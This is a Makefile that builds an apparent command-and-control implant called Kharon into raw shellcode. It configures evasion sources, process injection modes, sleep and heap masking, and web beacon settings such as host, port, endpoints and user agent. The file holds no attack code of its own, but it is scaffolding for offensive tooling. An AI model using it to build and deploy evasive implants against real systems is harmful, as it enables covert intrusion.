NAME   := Kharon

BUILD_PATH ?= .

CCX64  := clang -target x86_64-w64-mingw32
CCX86  := clang -target i686-w64-mingw32
ASMCC  := nasm

CFLAGS := -Os -nostdlib -fno-asynchronous-unwind-tables -std=c++20
CFLAGS += -fno-ident -fpack-struct=8 -falign-functions=1 -w -mno-sse -s
CFLAGS += -ffunction-sections -falign-jumps=1 -falign-labels=1 -mrdrnd
CFLAGS += -Wl,-s,--no-seh,--enable-stdcall-fixup -masm=intel -fno-exceptions
CFLAGS += -fms-extensions -fPIC -IInclude -Wl,-TLinker.ld

SRC    := $(wildcard Source/*.cc)
MISC   := $(wildcard Source/Misc/*.cc)
COMM   := $(wildcard Source/Communication/*.cc)
EVS    := $(wildcard Source/Evasion/*.cc)
OBJ64  := $(SRC:%.cc=%.x64.obj) $(MISC:%.cc=%.x64.obj) $(COMM:%.cc=%.x64.obj) $(EVS:%.cc=%.x64.obj)
OBJ86  := $(SRC:%.cc=%.x86.obj) $(MISC:%.cc=%.x86.obj) $(COMM:%.cc=%.x86.obj) $(EVS:%.cc=%.x86.obj)

DEFS := \
    -D KH_AGENT_UUID='"$(KH_AGENT_UUID)"' \
    -D KH_SLEEP_TIME=$(KH_SLEEP_TIME) \
    -D KH_SPAWNTO_X64='"$(KH_SPAWNTO_X64)"' \
    -D KH_INJECTION_PE=$(KH_INJECTION_PE) \
    -D KH_INJECTION_SC=$(KH_INJECTION_SC) \
    -D KH_HEAP_MASK=$(KH_HEAP_MASK) \
    -D KH_SLEEP_MASK=$(KH_SLEEP_MASK) \
    -D WEB_HOST='L"$(WEB_HOST)"' \
    -D WEB_CONN_QUANTITY=$(WEB_CONN_QUANTITY) \
    -D WEB_PORT=$(WEB_PORT) \
    -D WEB_ENDPOINT='L"$(WEB_ENDPOINT)"' \
    -D WEB_USER_AGENT='L"$(WEB_USER_AGENT)"' \
    -D WEB_ENDPOINT_QUANTITY=$(WEB_ENDPOINT_QUANTITY)

all: release debug
release: x64 x86
debug: 	 x64-debug x86-debug

x64-debug: CFLAGS += -D DEBUG
x64-debug: x64

x86-debug: CFLAGS += -D DEBUG
x86-debug: x86

x64: nasm64 $(OBJ64)
	@ echo "compiling x64 project"
	@ $(CCX64) $(BUILD_PATH)/Bin/obj/*.x64.obj -o $(BUILD_PATH)/Bin/$(NAME).x64.exe $(CFLAGS) 
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x64.bin $(BUILD_PATH)/Bin/$(NAME).x64.exe
	# @ rm $(BUILD_PATH)/$(NAME).x64.exe

x86: nasm86 $(OBJ86)
	@ echo "compiling x86 project"
	@ $(CCX86) $(BUILD_PATH)/obj/*.x86.obj -o $(BUILD_PATH)/$(NAME).x86.exe $(CFLAGS)
	@ objcopy --dump-section .text=$(BUILD_PATH)/Bin/$(NAME).x86.bin $(BUILD_PATH)/Bin/$(NAME).x86.exe
	@ rm $(BUILD_PATH)/Bin/$(NAME).x86.exe

%.x64.obj: %.cc
	@ echo "-> compiling $< to $(notdir $@)"
	@ $(CCX64) -o $(BUILD_PATH)/Bin/obj/$(notdir $@) -c $< $(CFLAGS) $(DEFS)

%.x86.obj: %.cc
	@ echo "-> compiling $< to $(notdir $@)"
	@ $(CCX86) -o $(BUILD_PATH)/Bin/obj/$(notdir $@) -c $< $(CFLAGS) $(DEFS)

nasm64:
	@ $(ASMCC) -f win64 Source/Asm/Entry.x64.asm -o $(BUILD_PATH)/Bin/obj/entry.x64.obj

nasm86:
	@ $(ASMCC) -f win32 Source/Asm/Entry.x64.asm -o $(BUILD_PATH)/Bin/obj/entry.x86.obj

stomper:
	@ $(CCX64) test/stomper.cc -o test/stomper.x64.exe -w
	@ $(CCX86) test/stomper.cc -o test/stomper.x86.exe -w

clean:
	@ rm -f $(BUILD_PATH)/obj/*.x64.obj
	@ rm -f $(BUILD_PATH)/obj/*.x86.obj
	@ rm -f $(BUILD_PATH)/*.exe
	@ rm -f $(BUILD_PATH)/*.Bin
	@ echo "removed object files"